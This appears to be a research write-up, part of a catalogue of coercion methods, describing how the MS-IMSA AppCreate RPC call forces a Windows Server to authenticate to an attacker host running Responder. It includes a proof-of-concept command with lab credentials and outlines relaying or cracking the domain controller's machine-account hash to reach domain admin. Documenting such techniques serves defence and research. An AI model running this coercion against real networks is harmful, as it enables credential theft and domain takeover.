# MS-IMSA - Remote call to AppCreate (opnum 3)

## Summary

 - **Protocol**: [[MS-IMSA]: Internet Information Services (IIS) IMSAdminBaseW Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/9cd07fff-2cb6-44fb-be98-6f292ae2a457)

 - **Protocol UUID**: 70b51430-b6ca-11d0-b9b9-00a0c922e750

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`AppCreate`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/b2fb150c-2da2-4010-970e-125c86a948ec)

 - **Function operation number**: `3`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-IMSA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/9cd07fff-2cb6-44fb-be98-6f292ae2a457) protocol (with uuid `70b51430-b6ca-11d0-b9b9-00a0c922e750` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-IMSA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/9cd07fff-2cb6-44fb-be98-6f292ae2a457) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-IMSA]: Internet Information Services (IIS) IMSAdminBaseW Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/9cd07fff-2cb6-44fb-be98-6f292ae2a457) and allows to call RPC functions of this protocol. We will then call the remote [`AppCreate`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/b2fb150c-2da2-4010-970e-125c86a948ec) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
AppCreate('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT AppCreate(
   [in, unique, string] LPCWSTR szMDPath,
   [in] BOOL fInProc
 );
```

## References

 - Documentation of protocol [MS-IMSA]: Internet Information Services (IIS) IMSAdminBaseW Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/9cd07fff-2cb6-44fb-be98-6f292ae2a457

 - Documentation of function `AppCreate`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-imsa/b2fb150c-2da2-4010-970e-125c86a948ec